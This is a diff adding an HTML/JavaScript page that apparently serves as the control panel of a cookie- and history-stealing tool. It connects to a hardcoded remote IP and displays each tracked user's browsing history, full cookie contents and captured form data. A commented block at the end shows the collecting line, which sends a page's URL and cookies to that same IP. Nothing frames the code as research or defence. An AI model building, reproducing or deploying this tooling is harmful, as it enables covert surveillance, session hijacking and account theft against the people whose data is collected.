@@ -1,0 +1,128 @@
+<html>
+    <head>
+        <script src='socket.io.js'></script>
+        <script src='jquery.min.js'></script>
+        <script type="text/javascript">
+            /*function foldDiv(id){
+                var a = '#toggle_'+id;
+                $(a).click(function(){
+                    $('#'+id).toggle();
+                });
+            }*/
+            function foldDiv(id){
+                $('#'+id).toggle();
+            };
+            function getUserList(element) {
+                
+                var htmlText = '';
+                socket = io('http://54.147.238.233:32873');
+                socket.emit('user_list', {},function (data) {
+                    console.log(data); 
+                    data.forEach(function(entry)
+                    {
+                        /*var userDiv = document.createElement('div');
+                        userDiv.id = 'user+'entry.user_id;
+                        userDiv.className = 'user';
+                        userDiv.innerHTML = '<a href="javascript:foldDiv('+entry.user_id+')" id="toggle_'+entry.user_id+'" target="_self">User ID: '+entry.user_id+'</a>';
+                        var userDivContent = document.createElement('div');
+                        userDivContent.id = entry.user_id;
+                        userDiv.className = 'user_content';
+                        var history = document.createElement('div');
+                        history.id = 'history+'entry.user_id;
+                        history.className = 'history';
+                        history.innerHTML = '<a href="javascript:foldDiv(history_'+entry.user_id+')" id="toggle_history_'+entry.user_id+'" target="_self">User ID: '+entry.user_id+'</a>';
+                        userDivContent.appendChild(history);
+                        userDiv.appendChild(userDivContent);*/
+                        console.log("debug 1");
+                        console.log(entry);
+                        htmlText += '<button style="height:50px;width:100%" onclick="foldDiv(\''+entry.user_id+'\')">User ID: '+entry.user_id+'</button>';
+                        //htmlText += '<a href="javascript:foldDiv(\''+entry.user_id+'\');" id="toggle_'+entry.user_id+'" target="_self">User ID: '+entry.user_id+'</a>';
+                        htmlText += '<div class="div-conatiner" id="'+entry.user_id+'" style="display: none;">';
+                        //htmlText += '<p class="p-user"> User ID  : ' + entry.user_id + '</p>';
+                        htmlText += '<p class="p-date"> Last Seen: ' + entry.last_online + '</p>';
+                        htmlText += '<p align="right"><button style="height:40px;width:95%" onclick="foldDiv(\'history_'+entry.user_id+'\')">History: </button></p>'
+                        //htmlText += '<p><a href="javascript:foldDiv(\'history_'+entry.user_id+'\');" id="toggle_history_'+entry.user_id+'" target="_self">History:</a></p>';
+                        htmlText += '<div class="history" id="history_'+entry.user_id+'" style="display: none;">';
+                        entry.history.forEach(function(history)
+                        {
+                            var buttontext;
+                            if (history.title == "")
+                                buttontext = history.url.substring(0, 100);
+                            else
+                                buttontext = history.title;
+                            htmlText += '<p align="right"><button style="height:30px; width:90%" onclick="foldDiv(\'history_'+history.id+'\')">'+buttontext+' </button></p>';
+                            //htmlText += '<p><a href="javascript:foldDiv(\'history_'+history.id+'\');" id="toggle_history_'+history.id+'" target="_self"> '+history.title+' : '+history.url+' </a></p>';
+                            htmlText += '<div class="one-history" id="history_'+history.id+'" style="width:80%; display: none;float: right;">';
+                            htmlText += '<p class="p-cookies-id"><pre>' + JSON.stringify(history, null, 2) + '</pre></p>';
+                            htmlText += '</div>';
+                        });
+                        htmlText += '</div>';
+
+                        htmlText += '<p align="right"><button style="height:40px;width:95%" onclick="foldDiv(\'cookies_'+entry.user_id+'\')">Cookies: </button></p>'
+                        //htmlText += '<p><a href="javascript:foldDiv(\'cookies_'+entry.user_id+'\');" id="toggle_cookies_'+entry.user_id+'" target="_self">Cookies:</a></p>'
+                        htmlText += '<div class="cookies" id="cookies_'+entry.user_id+'" style="display: none;">';
+                        var count = 0;
+                        entry.cookies.forEach(function(cookies){
+                            htmlText += '<p align="right"><button style="height:30px; width:90%" onclick="foldDiv(\'cookies_'+count+'\')">'+cookies.domain+cookies.path+cookies.name+'</button></p>';
+                            htmlText += '<div class="one-cookies" id="cookies_'+count+'" style="width:80%; display: none;float: right;">';
+                            htmlText += '<p class="p-cookies-id"><pre>' + JSON.stringify(cookies, null, 2) + '</pre></p>';
+                            htmlText += '</div>';
+                            count++;
+                        });
+                        htmlText += '</div>';                      
+                        if (entry.forms !== undefined)
+                        {
+                            htmlText += '<p align="right"><button style="height:40px;width:95%" onclick="foldDiv(\'forms_'+entry.user_id+'\')">Forms: </button></p>';
+                            htmlText += '<div class="forms" id="forms_'+entry.user_id+'" style="display: none;">';
+                            var count = 0;
+                            entry.forms.forEach(function(forms){
+                                htmlText += '<p align="right"><button style="height:30px; width:90%" onclick="foldDiv(\'forms_'+count+'\')">'+forms.baseURI+'</button></p>';
+                                htmlText += '<div class="one-cookies" id="forms_'+count+'" style="width:80%; display: none;float: right;">';
+                                htmlText += '<p class="p-cookies-id"><pre>' + JSON.stringify(forms, null, 2) + '</pre></p>';
+                                htmlText += '</div>';
+                            });
+                            htmlText += '</div>';
+                        }
+                        
+                        
+                        //element.appendChild(userDiv);
+                        
+                    });
+                    element.innerHTML = htmlText;     
+                });
+                
+                
+               
+            }
+        </script>
+    </head>
+    <body>
+        <script type="text/javascript"> 
+            
+            getUserList(document.body);
+            //console.log(userList);
+            //console.log(userList.length);
+            
+        </script>
+    
+      
+    </body>
+</html>
+
+
+
+
+
+
+
+
+<!-- <form onsubmit="return doSomething();" class="my-form">
+    <input type="submit" value="Submit">
+</form> -->
+
+
+
+<!-- 
+	socket = io('http://54.147.238.233:3418');
+		socket.emit('cookie_info', {  'url': request.url,'cookie': request.cookie},function(){socket.disconnect();});
+		console.log(request.cookie); -->
